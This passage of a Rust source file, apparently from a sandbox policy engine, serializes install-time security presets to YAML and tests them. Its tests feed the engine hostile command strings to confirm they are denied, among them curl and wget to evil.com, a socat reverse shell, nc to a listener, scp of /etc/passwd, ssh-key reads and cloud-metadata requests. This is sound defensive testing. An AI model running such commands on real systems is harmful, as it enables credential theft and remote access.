        SectionValue::List(items) => {
            out.push_str(&format!("{}:\n", name));
            for item in items {
                out.push_str(&format!("  - {}\n", yaml_quote(item)));
            }
        }
        SectionValue::RuleList(rules) => {
            out.push_str(&format!("{}:\n", name));
            for rule in rules {
                write_rule(out, rule, "  ");
            }
        }
    }
}

fn write_rules_list(out: &mut String, key: &str, rules: &[Rule]) {
    if rules.is_empty() {
        return;
    }
    out.push_str(&format!("  {}:\n", key));
    for rule in rules {
        write_rule(out, rule, "    ");
    }
}

fn write_rule(out: &mut String, rule: &Rule, indent: &str) {
    match rule {
        Rule::Simple(s) => {
            out.push_str(&format!("{}- {}\n", indent, yaml_quote(s)));
        }
        Rule::WithConstraints {
            pattern,
            constraints,
        } => {
            let quoted: Vec<String> = constraints.iter().map(|c| yaml_quote(c)).collect();
            out.push_str(&format!(
                "{}- {}: [{}]\n",
                indent,
                yaml_quote(pattern),
                quoted.join(", ")
            ));
        }
    }
}

/// Quote a YAML string value if it contains special characters.
fn yaml_quote(s: &str) -> String {
    // Needs quoting if: contains special chars, starts with *, or looks like a YAML value
    let needs_quoting = s.contains('*')
        || s.contains(':')
        || s.contains('#')
        || s.contains('{')
        || s.contains('}')
        || s.contains('[')
        || s.contains(']')
        || s.contains(',')
        || s.contains('&')
        || s.contains('!')
        || s.contains('|')
        || s.contains('>')
        || s.contains('\'')
        || s.contains('"')
        || s.contains('%')
        || s.contains('@')
        || s.contains('`')
        || s == "true"
        || s == "false"
        || s == "null"
        || s == "yes"
        || s == "no"
        || s == "on"
        || s == "off"
        || s.starts_with(' ')
        || s.ends_with(' ')
        || s.is_empty();

    if needs_quoting {
        format!("\"{}\"", s.replace('\\', "\\\\").replace('"', "\\\""))
    } else {
        s.to_string()
    }
}

// ---------------------------------------------------------------------------
// Embedded policy API
// ---------------------------------------------------------------------------

/// Default security policy YAML (observe-mode: nothing is blocked).
pub static DEFAULT_SECURITY_YAML: LazyLock<String> =
    LazyLock::new(|| policy_to_yaml(&default_policy(), "default"));

/// Return the embedded YAML template for a given policy name.
pub fn embedded_policy(name: &str) -> Option<String> {
    let (policy, label) = match name {
        "npm-install" => (npm_install(), name),
        "pypi-install" => (pypi_install(), name),
        "comfyui" => (comfyui(), name),
        "openclaw" => (openclaw(), name),
        "bash-install" => (bash_install(), name),
        "air-gap" => (air_gap(), name),
        _ => return None,
    };
    Some(policy_to_yaml(&policy, label))
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::compiled::{EnforcementMode, Runtime};
    use crate::policy::engine::{PolicyAction, PolicyEngine};
    use crate::policy::parser::parse_policy;

    // =====================================================================
    // parse_yaml_list tests
    // =====================================================================

    #[test]
    fn test_parse_yaml_list_basic() {
        let yaml = "- foo\n- bar\n- baz\n";
        assert_eq!(parse_yaml_list(yaml), vec!["foo", "bar", "baz"]);
    }

    #[test]
    fn test_parse_yaml_list_quoted() {
        let yaml = "- \"*.ssh/**\"\n- plain\n";
        assert_eq!(parse_yaml_list(yaml), vec!["*.ssh/**", "plain"]);
    }

    #[test]
    fn test_parse_yaml_list_comments_and_blanks() {
        let yaml = "# comment\n\n- item\n# another comment\n- item2\n";
        assert_eq!(parse_yaml_list(yaml), vec!["item", "item2"]);
    }

    // =====================================================================
    // Group macro tests
    // =====================================================================

    #[test]
    fn test_credential_files_group_nonempty() {
        assert!(!credential_files!().is_empty());
        assert!(credential_files!().iter().any(|p| p.contains(".ssh")));
    }

    #[test]
    fn test_warn_baseline_composite_nonempty() {
        assert!(!warn_baseline!().is_empty());
        assert!(warn_baseline!().iter().any(|p| p == "osascript"));
    }

    #[test]
    fn test_warn_categories_cover_baseline() {
        // Each sub-category should be non-empty
        assert!(!scripting!().is_empty());
        assert!(!exfiltration!().is_empty());
        assert!(!credential_readers!().is_empty());
        assert!(!anti_tracing!().is_empty());
        assert!(!interprocess_communication!().is_empty());
        assert!(!reconnaissance!().is_empty());
        assert!(!container_escape!().is_empty());
        assert!(!mandatory_access_control!().is_empty());
        assert!(!filesystem_hardening!().is_empty());
        assert!(!kernel!().is_empty());
        assert!(!debug_injection!().is_empty());
        assert!(!privilege_escalation!().is_empty());
        // Composite should equal sum of parts
        let sum = scripting!().len()
            + exfiltration!().len()
            + credential_readers!().len()
            + anti_tracing!().len()
            + interprocess_communication!().len()
            + reconnaissance!().len()
            + container_escape!().len()
            + mandatory_access_control!().len()
            + filesystem_hardening!().len()
            + kernel!().len()
            + debug_injection!().len()
            + privilege_escalation!().len();
        assert_eq!(warn_baseline!().len(), sum);
    }

    // =====================================================================
    // rules! macro tests
    // =====================================================================

    #[test]
    fn test_rules_macro_empty() {
        let r: Vec<Rule> = rules![];
        assert!(r.is_empty());
    }

    #[test]
    fn test_rules_macro_literals() {
        let r = rules!["a", "b", "c"];
        assert_eq!(r.len(), 3);
        assert!(matches!(&r[0], Rule::Simple(s) if s == "a"));
        assert!(matches!(&r[1], Rule::Simple(s) if s == "b"));
        assert!(matches!(&r[2], Rule::Simple(s) if s == "c"));
    }

    #[test]
    fn test_rules_macro_group() {
        let r = rules![credential_files!()];
        assert!(r.len() >= 10);
        assert!(matches!(&r[0], Rule::Simple(s) if s.contains(".ssh")));
    }

    #[test]
    fn test_rules_macro_mixed() {
        let r = rules!["a", credential_files!(), "z"];
        assert!(r.len() >= 12);
        assert!(matches!(&r[0], Rule::Simple(s) if s == "a"));
        assert!(matches!(r.last().unwrap(), Rule::Simple(s) if s == "z"));
    }

    // =====================================================================
    // YAML serializer tests
    // =====================================================================

    #[test]
    fn test_yaml_serializer_round_trip() {
        let policy = npm_install();
        let yaml = policy_to_yaml(&policy, "npm-install");

        // Parse it back
        let parsed = parse_policy(&yaml).expect("generated YAML must parse");
        assert_eq!(parsed.version, 1);

        // Compile and verify a key behavior
        let engine = PolicyEngine::from_yaml(&yaml).expect("generated YAML must compile");
        let d = engine.evaluate_file("~/.ssh/id_rsa");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_yaml_serializer_round_trip_comfyui() {
        let policy = comfyui();
        let yaml = policy_to_yaml(&policy, "comfyui");

        let engine = PolicyEngine::from_yaml(&yaml).expect("comfyui YAML must compile");

        // Verify protocols
        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_yaml_quote_special_chars() {
        assert_eq!(yaml_quote("simple"), "simple");
        assert_eq!(yaml_quote("*.ssh/**"), "\"*.ssh/**\"");
        assert_eq!(yaml_quote("true"), "\"true\"");
        assert_eq!(yaml_quote("["), "\"[\"");
    }

    #[test]
    fn test_all_presets_produce_valid_yaml() {
        let presets: Vec<(&str, PolicyFile)> = vec![
            ("default", default_policy()),
            ("npm-install", npm_install()),
            ("pypi-install", pypi_install()),
            ("comfyui", comfyui()),
            ("openclaw", openclaw()),
            ("bash-install", bash_install()),
            ("air-gap", air_gap()),
        ];

        for (name, policy) in presets {
            let yaml = policy_to_yaml(&policy, name);
            let parsed = parse_policy(&yaml)
                .unwrap_or_else(|e| panic!("{} YAML failed to parse: {}", name, e));
            assert_eq!(parsed.version, 1, "{} version mismatch", name);

            let _engine = PolicyEngine::from_yaml(&yaml)
                .unwrap_or_else(|e| panic!("{} YAML failed to compile: {}", name, e));
        }
    }

    // =====================================================================
    // ComfyUI auto-policy: attack scenario tests
    // =====================================================================

    fn comfyui_engine() -> PolicyEngine {
        let yaml = embedded_policy("comfyui").expect("comfyui policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("comfyui policy must parse")
    }

    #[test]
    fn test_comfyui_policy_parses() {
        let engine = comfyui_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_comfyui_python_block_and_allow_coexist() {
        let engine = comfyui_engine();

        // getpass.getpass → Block (from python: deny:)
        let d = engine.evaluate_function(Runtime::Python, "getpass.getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        // ctypes.CDLL → Block (from python: deny:)
        let d = engine.evaluate_function(Runtime::Python, "ctypes.CDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        // Unlisted function → allowed (no warn section, HTTP handled by network allowlist)
        let d = engine.evaluate_function(Runtime::Python, "json.loads", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_e_ctypes_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_function(Runtime::Python, "ctypes.CDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_function(Runtime::Python, "ctypes.cdll.LoadLibrary", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "ctypes.WinDLL", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_attack_c_github_api_exfil() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url("https://api.github.com/gists", "api.github.com/gists");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "https://github.com/comfyanonymous/ComfyUI/archive/main.zip",
            "github.com/comfyanonymous/ComfyUI/archive/main.zip",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_pypi_allowed() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url(
            "https://pypi.org/simple/requests/",
            "pypi.org/simple/requests/",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://files.pythonhosted.org/packages/requests-2.31.0.tar.gz",
            "files.pythonhosted.org/packages/requests-2.31.0.tar.gz",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_attack_h_git_push_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_execution("git push origin main");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("git clone https://github.com/example/repo.git");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("git pull origin main");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_protocols_restricted() {
        let engine = comfyui_engine();

        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);

        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_credential_functions_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_function(Runtime::Python, "getpass.getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "keyring.get_password", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Python, "keyring.set_password", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_shell_execution_warned() {
        let engine = comfyui_engine();

        // os.system/os.popen are warned (not blocked) — the commands section
        // enforces what child processes actually execute.
        let d = engine.evaluate_function(Runtime::Python, "os.system", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.mode, EnforcementMode::Warn);

        let d = engine.evaluate_function(Runtime::Python, "os.popen", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.mode, EnforcementMode::Warn);
    }

    #[test]
    fn test_comfyui_dangerous_commands_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("sh");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("bash");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_git_remote_manipulation_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_execution("git remote add exfil https://evil.com/repo.git");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("git remote set-url origin https://evil.com/repo.git");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_model_downloads_allowed() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url(
            "https://huggingface.co/stabilityai/stable-diffusion-xl/resolve/main/model.safetensors",
            "huggingface.co/stabilityai/stable-diffusion-xl/resolve/main/model.safetensors",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://civitai.com/api/download/models/12345",
            "civitai.com/api/download/models/12345",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "http://127.0.0.1:8188/api/queue",
            "127.0.0.1:8188/api/queue",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_unlisted_domains_blocked() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url("https://hidden.onion/", "hidden.onion/");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_sensitive_files_denied() {
        let engine = comfyui_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/home/user/.ssh/id_ed25519");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.config/gh/hosts.yml");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/model.safetensors");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_comfyui_sensitive_envvars_denied() {
        let engine = comfyui_engine();

        let d = engine.evaluate_envvar("MY_SECRET");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("API_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DB_PASSWORD");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("STRIPE_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("AWS_ACCESS_KEY_ID");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("OPENAI_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("ANTHROPIC_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HF_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("PATH");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    // =====================================================================
    // bash-install auto-policy: attack scenario tests
    // =====================================================================

    fn bash_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("bash-install").expect("bash-install policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("bash-install policy must parse")
    }

    #[test]
    fn test_bash_install_policy_parses() {
        let engine = bash_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_bash_install_allows_curl_wget() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("curl -fsSL https://example.com/install.sh");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("wget -O- https://example.com/install.sh");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_allows_build_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("make install");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("cargo build --release");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("gcc -o tool tool.c");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_allows_package_managers() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("apt-get install -y libssl-dev");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("brew install openssl");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("pip install setuptools");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_blocks_interpreters() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("python3 -c 'import os; os.system(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("perl -e 'exec(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ruby -e 'system(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine
            .evaluate_execution("node -e 'require(\"child_process\").exec(\"curl evil.com\")'");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_persistence() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("crontab -e");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("at now + 30 minutes");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("launchctl load ~/Library/LaunchAgents/com.evil.plist");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_reviews_privilege_escalation() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("sudo bash -c 'echo evil >> /etc/crontab'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);

        let d = engine.evaluate_execution("su root");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);
    }

    #[test]
    fn test_bash_install_blocks_obfuscation_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("base64 -d /tmp/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("xxd -r -p /tmp/hex");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("rev /tmp/reversed");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_dns_exfiltration() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("dig chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nslookup chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_raw_net_tools() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("nc evil.com 4444");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("socat TCP:evil.com:4444 EXEC:/bin/bash");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_clipboard() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("pbcopy");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("xclip -selection clipboard");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_warns_on_eval() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("eval echo test");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_credential_files() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_shell_profile_writes() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("~/.bashrc");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.zshrc");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.profile");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_git_hooks() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file(".git/hooks/pre-commit");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/home/user/project/.git/hooks/post-checkout");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_env_secrets() {
        let engine = bash_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_bash_install_blocks_anti_tracing_envvars() {
        let engine = bash_install_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_dd() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("dd if=~/.ssh/id_rsa of=/dev/stdout");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_bash_install_warns_ln() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("ln -s ~/.ssh /tmp/x");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_bash_install_blocks_symlink_link_symbols() {
        let engine = bash_install_engine();

        let d = engine.evaluate_native_function("symlink", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("link", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_syscall_symbol() {
        let engine = bash_install_engine();

        let d = engine.evaluate_native_function("syscall", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_protocols_restricted() {
        let engine = bash_install_engine();

        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);

        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_native_getpass_crypt() {
        let engine = bash_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_remote_access() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("ssh user@evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("scp /etc/passwd user@evil.com:/tmp/");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_keychain() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("security find-generic-password -s github.com -w");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_shared_memory() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("/dev/shm/exfil");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // npm-install: base coverage tests
    // =====================================================================

    fn npm_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("npm-install").expect("npm-install policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("npm-install policy must parse")
    }

    #[test]
    fn test_npm_install_policy_parses() {
        let engine = npm_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_npm_install_blocks_credential_files() {
        let engine = npm_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("*/.kube/config");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_blocks_env_secrets() {
        let engine = npm_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_npm_install_blocks_native_getpass() {
        let engine = npm_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_blocks_filesystem_bypass_symbols() {
        let engine = npm_install_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_npm_install_blocks_cloud_metadata() {
        let engine = npm_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // pypi-install: base coverage tests
    // =====================================================================

    fn pypi_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("pypi-install").expect("pypi-install policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("pypi-install policy must parse")
    }

    #[test]
    fn test_pypi_install_policy_parses() {
        let engine = pypi_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_pypi_install_blocks_credential_files() {
        let engine = pypi_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pypi_install_blocks_env_secrets() {
        let engine = pypi_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_pypi_install_blocks_native_getpass() {
        let engine = pypi_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pypi_install_blocks_filesystem_bypass_symbols() {
        let engine = pypi_install_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_pypi_install_blocks_cloud_metadata() {
        let engine = pypi_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pypi_install_allows_pypi_network() {
        let engine = pypi_install_engine();

        let d =
            engine.evaluate_http_url("https://pypi.org/simple/flask/", "pypi.org/simple/flask/");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_pypi_install_blocks_non_pypi_network() {
        let engine = pypi_install_engine();

        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pypi_install_allows_python_child_command() {
        let engine = pypi_install_engine();

        // python* is in allow — needed for uv interpreter probing and pip build
        // isolation. Safe because child processes get agent injected with same policy.
        let d = engine.evaluate_execution("python3");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_pypi_install_allows_rustc_command() {
        let engine = pypi_install_engine();

        let d = engine.evaluate_execution("rustc");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_pypi_install_allows_uv_child_command() {
        let engine = pypi_install_engine();

        let d = engine.evaluate_execution("uv");
        assert_eq!(d.action, PolicyAction::Allow);
